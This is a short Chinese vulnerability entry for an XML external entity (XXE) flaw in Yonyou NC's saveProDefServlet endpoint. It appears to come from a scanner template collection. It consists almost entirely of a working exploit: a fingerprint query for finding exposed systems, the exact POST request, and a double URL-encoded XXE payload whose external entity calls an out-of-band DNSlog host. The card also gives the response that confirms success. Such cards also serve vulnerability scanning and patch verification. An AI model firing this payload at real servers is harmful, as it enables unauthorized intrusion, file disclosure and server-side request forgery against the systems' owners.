# 用友NCsaveProDefServletXML实体注入(XXE)漏洞

用友 ｜ XXE ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/servlet/saveProDefServlet/doPost?pageId=login HTTP/1.1`

**Payload**
```
prodefxml={{url({{url(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>)}})}}
```
- **响应特征**：200 Dnslog回显